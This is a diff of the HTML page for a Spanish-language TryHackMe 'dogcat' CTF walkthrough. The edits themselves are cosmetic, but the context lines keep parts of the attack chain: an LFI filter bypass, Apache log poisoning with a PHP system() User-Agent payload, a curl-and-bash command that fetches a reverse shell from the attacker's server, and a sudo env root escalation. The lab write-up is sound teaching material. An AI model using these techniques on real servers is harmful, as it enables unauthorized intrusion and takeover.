@@ -1257,7 +1257,7 @@
     <meta property="twitter:description" content="Walkthrough :: Writeups de rooms y maquinas de TryHackMe, HackTheBox y CTFs, en español">
   
 
-<meta name="generator" content="Hugo 0.79.1" />
+<meta name="generator" content="Hugo 0.68.3" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1578,9 +1578,9 @@
   🏷️
   
 
-  <li><a href="https://sckull.github.io/tags/lfi/" class="single__tag" title="lfi">#lfi</a></li>
-
   <li><a href="https://sckull.github.io/tags/cron/" class="single__tag" title="cron">#cron</a></li>
+
+  <li><a href="https://sckull.github.io/tags/lfi/" class="single__tag" title="lfi">#lfi</a></li>
 
 </ul>
     </div>
@@ -1626,7 +1626,7 @@
 </tr>
 </tbody>
 </table>
-<h2 id="nmap">NMAP</h2>
+<h2 id="nmap-">NMAP</h2>
 <p>Escaneo de puertos tcp, nmap nos muestra el puerto http (445) y el puerto ssh (22) abiertos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1670,7 +1670,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <span class="c1"># Nmap done at Fri Apr 17 20:52:58 2020 -- 1 IP address (1 host up) scanned in 639.73 seconds</span>
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="gobuster">GOBUSTER</h2>
+</div><h2 id="gobuster-">GOBUSTER</h2>
 <p>Utilizamos gobuster para busqueda de directorios y archivos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1692,13 +1692,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 /dog.php <span class="o">(</span>Status: 200<span class="o">)</span>
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="http">HTTP</h2>
+</div><h2 id="http-">HTTP</h2>
 <p>Encontramos una pagina sencilla en el puerto 80, que al darle click a la opcion de perro (dog) nos muestra una imagen.<br />
 <img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.07.10.webp" alt="image" /></p>
 <p>Vemos que en la url le pasa por parametro la palabra dog. Dentro del escaneo de GOBUSTER vimos que existe un archivo cat y dog con extension en php, al ver el codigo fuente de ambas paginas y al recargar por repetidas ocaciones la imagen que genera junto al codigo html es distinta.<br />
 <img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.10.03.webp" alt="image" /></p>
 <p>Por lo que cada vez que se selecciona la opcion de dog o cat, nos muéstra distintas imagenes.</p>
-<h2 id="lfi---cat-or-dog">LFI - CAT OR DOG</h2>
+<h2 id="lfi---cat-or-dog-">LFI - CAT OR DOG</h2>
 <p>Intentamos utilizar LFI basico (/etc/passwd, /var/log/apache2/access.log, etc) pero no logramos leer ninguno de los archivos ya que la pagina nos mostraba el mensaje <code>Sorry, only dogs or cats are allowed.</code>.<br />
 <img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.12.36.webp" alt="image" /></p>
 <p>Lo curioso de este reto es que, al pasarle la palabra cat dentro de una peticion de un archivo o lo que fuera, nos mostraba el mensaje <code>Here you go!</code> y un error de la funcion <code>include()</code>. Desde aqui tiene un poco de sentido el mensaje de error anterior (<code>Sorry, only dogs or cats are allowed.</code>) podemos utilizar tanto dog o cat dentro de las peticiones para que sean aceptadas.</p>
@@ -1725,7 +1725,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">  <span class="o">&lt;?</span><span class="nx">php</span>
+<pre class="chroma"><code class="language-php" data-lang="php">  <span class="cp">&lt;?php</span>
       <span class="k">function</span> <span class="nf">containsStr</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$substr</span><span class="p">)</span> <span class="p">{</span>
           <span class="k">return</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$substr</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">;</span>
       <span class="p">}</span>
@@ -1738,13 +1738,13 @@ Service detection performed. Please report any incorrect results at https://nmap
           <span class="k">echo</span> <span class="s1">&#39;Sorry, only dogs or cats are allowed.&#39;</span><span class="p">;</span>
           <span class="p">}</span>
       <span class="p">}</span>
-  <span class="cp">?&gt;</span><span class="err"> 
-</span></code></pre></td></tr></table>
+  <span class="cp">?&gt;</span> 
+</code></pre></td></tr></table>
 </div>
 </div></details>
 <p>Leemos el archivo flag.php y logramos leer nuestra primera flag.<br />
 <img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.30.02.webp" alt="image" /></p>
-<h3 id="rce---apache-log-poisoning">RCE - Apache Log Poisoning</h3>
+<h3 id="rce---apache-log-poisoning-">RCE - Apache Log Poisoning</h3>
 <p>Utilizamos el User-Agent para poder ejecutar nuestro codigo php el que tendra como objetivo obtener y ejecutar un comando que le pasemos. Utilizamos <code>php://filter/dog/resource=../../../../var/log/apache2/access.log&amp;ext=</code> para leer el archivo log, además de esto agregamos el comando que deseamos ejecutar en la maquina <code>&amp;cmd=whoami</code>, por lo que luciría de la siguiente forma.</p>
 <p><a href="https://www.hackingarticles.in/apache-log-poisoning-through-lfi/"><strong>Apache Log Poisoning</strong></a></p>
 <div class="highlight"><div class="chroma">
@@ -1761,7 +1761,7 @@ User-Agent:Mozilla/5.0 &lt;?php system<span class="o">(</span><span class="nv">$
 </div>
 </div><p>Vemos que en la respuesta tenemos acceso como usuario <code>www-data</code>.<br />
 <img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.38.25.webp" alt="image" /></p>
-<h2 id="user---www-data">USER - WWW-DATA</h2>
+<h2 id="user---www-data-">USER - WWW-DATA</h2>
 <p>Ahora, creamos un archivo que contenga una shell inversa para descargarlo mediante un servidor de python (python3 -m http.server 80) en la maquina.</p>
 <p><strong>Comando para descargar y ejecutar nuestra shell (Codificamos a URL los espacios)</strong></p>
 <div class="highlight"><div class="chroma">
@@ -1782,7 +1782,7 @@ bash%20-c%20%20<span class="s2">&#34;</span><span class="k">$(</span>curl%20-s%2
 <img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2002.07.12.webp" alt="image" /></p>
 <p>Nuestra segunda flag.<br />
 <img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2002.08.02.webp" alt="image" /></p>
-<h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>
+<h2 id="privilege-escalation-">PRIVILEGE ESCALATION</h2>
 <p>Hacemos una pequeña enumeracion con <code>sudo -l -l</code> y vemos que tenemos permisos root (sudo) para ejecutar el comando <code>env</code>. Utilizamos env para obtener una shell root.</p>
 <p><img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2002.11.00.webp" alt="image" /></p>
 <div class="highlight"><div class="chroma">
@@ -3163,7 +3163,7 @@ document.addEventListener('DOMContentLoaded', function () {
             <p class="caption">
                 
                     
-                        ©2020, All Rights Reserved
+                        ©2021, All Rights Reserved
                     
                 
             </p>
@@ -3211,16 +3211,16 @@ document.addEventListener('DOMContentLoaded', function () {
             <li><a href="#informacion-de-la-maquina">Informacion de la Maquina</a></li>
           </ul>
         </li>
-        <li><a href="#nmap">NMAP</a></li>
-        <li><a href="#gobuster">GOBUSTER</a></li>
-        <li><a href="#http">HTTP</a></li>
-        <li><a href="#lfi---cat-or-dog">LFI - CAT OR DOG</a>
+        <li><a href="#nmap-">NMAP</a></li>
+        <li><a href="#gobuster-">GOBUSTER</a></li>
+        <li><a href="#http-">HTTP</a></li>
+        <li><a href="#lfi---cat-or-dog-">LFI - CAT OR DOG</a>
           <ul>
-            <li><a href="#rce---apache-log-poisoning">RCE - Apache Log Poisoning</a></li>
+            <li><a href="#rce---apache-log-poisoning-">RCE - Apache Log Poisoning</a></li>
           </ul>
         </li>
-        <li><a href="#user---www-data">USER - WWW-DATA</a></li>
-        <li><a href="#privilege-escalation">PRIVILEGE ESCALATION</a></li>
+        <li><a href="#user---www-data-">USER - WWW-DATA</a></li>
+        <li><a href="#privilege-escalation-">PRIVILEGE ESCALATION</a></li>
       </ul>
     </li>
   </ul>
